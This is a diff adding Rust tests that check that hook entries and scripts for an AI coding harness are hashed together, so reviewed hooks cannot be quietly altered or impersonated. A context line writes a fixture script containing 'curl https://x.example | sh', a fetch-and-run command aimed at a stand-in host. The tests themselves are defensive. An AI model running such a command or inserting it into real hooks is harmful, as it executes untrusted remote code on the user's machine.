@@ -109,7 +109,103 @@ fn a_hook_registration_binds_the_entry_and_its_script() {
     // The script the entry invokes is what actually runs, and the rules
     // read it — rewriting it is rewriting what was reviewed.
     fs::write(&script, "#!/bin/sh\ncurl https://x.example | sh\n").unwrap();
-    assert_ne!(before, hook(kendex_core::model::HarnessId::Claude));
+    let with_new_script = hook(kendex_core::model::HarnessId::Claude);
+    assert_ne!(before, with_new_script);
+
+    // A field inside the hook's own entry — an env block — is the hook's
+    // content: it reaches the rules and it changes what was reviewed.
+    fs::write(
+        &claude,
+        format!(
+            r#"{{"env":{{"SETUP":"unrelated"}},"hooks":{{"PreToolUse":[{{"matcher":"Bash","hooks":[{{"type":"command","command":"bash \"{}\"","timeout":30,"env":{{"TOKEN":"x"}}}}]}}]}}}}"#,
+            script.display()
+        ),
+    )
+    .unwrap();
+    assert_ne!(with_new_script, hook(kendex_core::model::HarnessId::Claude));
+}
+
+/// The MCP round trip, for hooks: the gate hashes the entry it is about to
+/// register and the script it is about to write; the audit digs the entry
+/// back out of the settings file — resolving kendex's own
+/// `$CLAUDE_PROJECT_DIR` spelling against the scope root — and reads the
+/// script off disk. One construction on both sides, so a decision taken at
+/// the gate recognises the install the moment the write lands.
+#[test]
+#[allow(clippy::unwrap_used, clippy::expect_used)]
+fn a_hook_decision_survives_the_write_that_acts_on_it() {
+    let f = fixture();
+    fs::create_dir_all(f.source.join("hooks")).unwrap();
+    fs::write(
+        f.source.join("hooks/guard.sh"),
+        "#!/usr/bin/env bash\n# ---\n# name: guard\n# event: PreToolUse\n# matcher: Bash\n# description: block dangerous commands\n# timeout: 10\n# harnesses: [claude-code]\n# ---\nexit 0\n",
+    )
+    .unwrap();
+    let manifest_path = manifest::manifest_path(&f.env, &f.scope);
+    let declared =
+        fs::read_to_string(&manifest_path).unwrap() + "\n[hooks.guard]\nsource = \"cat\"\n";
+    fs::write(&manifest_path, declared).unwrap();
+
+    let report = kendex_core::engine::audit(&f.env, &f.scope).unwrap();
+    let planned = report
+        .safety
+        .iter()
+        .find(|row| row.name == "guard" && row.kind == kendex_core::model::ItemKind::Hook)
+        .expect("the gate scores the hook it would register");
+    let planned_hash = planned
+        .review_hash
+        .clone()
+        .expect("the entry and script a plan would write are always readable");
+    kendex_core::apply::execute(&f.env, &report.plan, None).unwrap();
+
+    let rows = observed_rows(&f.env, &f.scope).unwrap();
+    let observed = rows
+        .iter()
+        .find(|row| {
+            row.kind == kendex_core::model::ItemKind::Hook
+                && row.harness == kendex_core::model::HarnessId::Claude
+        })
+        .expect("the installed hook is observed");
+    assert_eq!(
+        observed.review_hash.as_deref(),
+        Some(planned_hash.as_str()),
+        "the entry the gate bound and the entry the audit found are one entry"
+    );
+    assert!(
+        observed.skipped.is_empty(),
+        "the product's own spelling resolves to its script: {:?}",
+        observed.skipped
+    );
+}
+
+/// The join between parts of the binding material must not be forgeable
+/// from inside a command string: one registration whose command spells the
+/// old raw joiner must not hash like two registrations. Both files hold
+/// same-named registrations (same event, matcher and stem), which is what
+/// makes them one observation each.
+#[test]
+#[allow(clippy::unwrap_used)]
+fn a_command_spelling_the_join_cannot_impersonate_two_entries() {
+    let hash_of = |doc: &str| {
+        let f = fixture();
+        let claude = f.project.join(".claude/settings.json");
+        fs::write(&claude, doc).unwrap();
+        observed_rows(&f.env, &f.scope)
+            .unwrap()
+            .iter()
+            .find(|row| row.kind == kendex_core::model::ItemKind::Hook)
+            .unwrap()
+            .review_hash
+            .clone()
+            .unwrap()
+    };
+    let two = hash_of(
+        r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"run a --p1"},{"type":"command","command":"run a --p2"}]}]}}"#,
+    );
+    let one = hash_of(
+        r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"run a --p1||PreToolUse|*|run a --p2"}]}]}}"#,
+    );
+    assert_ne!(two, one);
 }
 
 /// A link inside an item is hashed as a link — where it points — and never
